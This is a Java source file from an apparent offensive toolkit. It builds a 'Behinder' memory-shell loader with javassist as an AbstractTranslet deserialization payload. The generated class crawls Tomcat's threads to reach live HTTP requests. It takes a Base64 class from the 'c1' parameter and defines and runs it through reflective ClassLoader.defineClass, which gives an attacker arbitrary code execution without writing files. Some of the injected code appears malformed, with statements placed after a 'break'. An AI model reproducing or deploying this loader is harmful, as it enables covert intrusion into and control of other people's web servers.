package cn.safe6.payload.memshell;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.coyote.RequestInfo;

import javax.servlet.jsp.PageContext;


/**
 * 新版冰蝎loader，不依赖pageContent
 */
public class Loader {

    public static byte[] getPayload() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
        classPool.insertClassPath(new ClassClassPath(PageContext.class));
        classPool.insertClassPath(new ClassClassPath(MemBehinder3.class));

        CtClass ctClass = classPool.makeClass("BehinderLoader"+ System.nanoTime());
        ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
        ctClass.addMethod(CtMethod.make("    public static Object getField(Object obj,String fieldName) throws Exception{\n" +
                "        java.lang.reflect.Field f0 = null;\n" +
                "        Class clas = obj.getClass();\n" +
                "\n" +
                "        while (clas != Object.class){\n" +
                "            try {\n" +
                "                f0 = clas.getDeclaredField(fieldName);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException e){\n" +
                "                clas = clas.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (f0 != null){\n" +
                "            f0.setAccessible(true);\n" +
                "            return f0.get(obj);\n" +
                "        }else {\n" +
                "            throw new NoSuchFieldException(fieldName);\n" +
                "        }\n" +
                "    }",ctClass));

        String method = "        try {\n" +
                "            boolean flag = false;\n" +
                "            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),\"threads\");\n" +
                "            for (int i=0;i<threads.length;i++){\n" +
                "                Thread thread = threads[i];\n" +
                "                if (thread != null){\n" +
                "                    String threadName = thread.getName();\n" +
                "                    if (!threadName.contains(\"exec\") && threadName.contains(\"http\")){\n" +
                "                        Object target = getField(thread,\"target\");\n" +
                "                        Object global = null;\n" +
                "                        if (target instanceof Runnable){\n" +
                "                            // 需要遍历其中的 this$0/handler/global\n" +
                "                            // 需要进行异常捕获，因为存在找不到的情况\n" +
                "                            try {\n" +
                "                                global = getField(getField(getField(target,\"this$0\"),\"handler\"),\"global\");\n" +
                "                            } catch (NoSuchFieldException fieldException){\n" +
                "                                fieldException.printStackTrace();\n" +
                "                            }\n" +
                "                        }\n" +
                "                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors\n" +
                "                        if (global != null){\n" +
                "                            java.util.List processors = (java.util.List) getField(global,\"processors\");\n" +
                "                            for (i=0;i<processors.size();i++){\n" +
                "                                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);\n" +
                "                                if (requestInfo != null){\n" +
                "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,\"req\");\n" +
                "                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "                                    javax.servlet.http.HttpSession session = request.getSession();\n" +

                "                                     String  c1 = (String)request.getParameter(\"c1\");\n" +

                "                                    if (c1 != null){\n" +
                "                                            try {\n" +
                "                                                       byte[] cdata = java.util.Base64.getDecoder().decode(c1);\n" +
                "                                                       java.lang.reflect.Method met = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
                "                                                       met.setAccessible(true);\n" +
                "                                                       Class var20 = (Class)met.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{cdata, new Integer(0), new Integer(cdata.length)});\n" +
                "                                                       var20.newInstance().equals(request);\n" +
                "                                                   } catch (Exception var21) {\n" +
                "                                                       var21.printStackTrace();\n" +
                "                                                   }\n" +
                "                                    }\n" +

                "\n" +

                "                                        flag = true;\n" +
                "                                        break;\n" +
                "                                    if (flag){\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                }\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "                if (flag){\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }";
        ctClass.makeClassInitializer().insertBefore(method);
        return ctClass.toBytecode();
    }

}
